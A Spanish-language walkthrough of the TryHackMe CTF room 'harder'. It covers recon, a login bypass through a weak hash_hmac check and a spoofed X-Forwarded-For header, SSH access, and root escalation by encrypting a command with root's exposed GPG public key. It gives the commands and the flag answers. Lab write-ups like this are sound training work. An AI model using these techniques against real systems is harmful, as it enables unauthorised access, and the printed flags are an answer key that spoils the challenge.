# harder

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF | harder | https://tryhackme.com/room/harder | 02 Level Medium | TryHackMe | nmap, php-fpm, PHP Info, hash_hmac, X-Forwarded-For, SSH, GnuPG (execute-crypted) | Compromiso total -> user y root flag |

---

**Contexto:** **harder** es un CTF boot-to-root Medium inspirado en hallazgos reales. Arranca con un `nmap` que muestra un servidor PHP-FPM; dirsearch con el wordlist `common.txt` localiza una página de info.php expuesta. Interceptando la petición principal con Burp se descubre el virtual host `pwd.harder.local`. La autenticación usa un `hash_hmac` custom que se derrota (texto plano + bypass del hmac) y un control por `X-Forwarded-For`. Con las credenciales de `evs` se entra por SSH, se comprueba que `/usr/local/bin/execute-crypted` ejecuta comandos cifrados para root con GPG, y reutilizando la clave pública (`/var/backup/root@harder.local.pub`) se cifra un comando para leer la root flag.

## Solucionario

### Task 1: Hack your way and try harder

**Explicación:** Tras la enumeración se localiza php-fpm y la página PHP Info, y con Burp el virtual host `pwd.harder.local`. La web pide autenticación; el `index.php` referencia ficheros e incluso muestra una password en texto plano. El mecanismo usa `hash_hmac` (PHP) y la protección de IP se salta añadiendo `X-Forwarded-For: 10.10.10.15` al login. Con esas credenciales (`evs`) se accede por SSH y se obtiene la user.txt. La escalada: `execute-crypted` corre comandos cifrados para `root@harder.local`; se exporta la clave pública desde `/var/backup`, se cifra `cat /root/root.txt` con `gpg` y se ejecuta con `execute-crypted command.gpg` obteniendo la root.txt.

```bash
nmap -sV -sC <IP>
dirsearch -u http://<IP> -w common.txt
# agregar pwd.harder.local al /etc/hosts
# login con evs + X-Forwarded-For: 10.10.10.15 (bypass hash_hmac)
ssh evs@<IP>
cat user.txt
harder:~$ find / -type f -user root -perm -u=s 2>/dev/null
harder:~$ /usr/local/bin/execute-crypted
harder:~$ cat /var/backup/root@harder.local.pub
harder:~$ gpg --import /var/backup/root@harder.local.pub
harder:~$ echo -n "cat /root/root.txt" > command
harder:~$ gpg -r <KEY_ID> --encrypt command
harder:~$ execute-crypted command.gpg
```

Respuestas de la tarea:

1. `7e88bf11a579dc5ed66cc798cbe49f76`
2. `3a7bd72672889e0756b09f0566935a6c`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1.1 | Hack the machine and obtain the user Flag (user.txt) | `7e88bf11a579dc5ed66cc798cbe49f76` |
| 1.2 | Escalate your privileges and get the root Flag (root.txt) | `3a7bd72672889e0756b09f0566935a6c` |

---

**Metodología:** Escaneo de puertos, fuzzing de directorios, fingerprint de PHP/php-fpm, descubrimiento de virtual host, revisión de código fuente, debilitamiento del control `hash_hmac`, spoofing `X-Forwarded-For`, acceso SSH y escalada por leak de la clave pública GPG del script privilegiado (PTES: recon, vulnerability analysis, exploitation, privilege escalation).

**Learning chain:** nmap → php-fpm → info.php → pwd.harder.local → index.php (password texto plano) → hash_hmac bypass → login evs (X-Forwarded-For) → SSH → user.txt → execute-crypted (comandos gpg para root) → import root@harder.local.pub → gpg encrypt → root.txt.

**Lección:** *Un script que ejecuta comandos cifrados "solo para root" pierde todo su valor si la clave pública de root está accesible: cualquiera puede cifrar el comando que quiera y el script lo ejecutará con privilegios.*

**MITRE ATT&CK:** T1046 Network Service Discovery · T1083 File and Directory Discovery · T1552.001 Unsecured Credentials (password en texto plano) · T1573 Encrypted Channel (cifrado GPG) · T1068 Exploitation for Privilege Escalation (abuso de execute-crypted).

**Fuente:** [TryHackMe - harder](https://tryhackme.com/room/harder)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.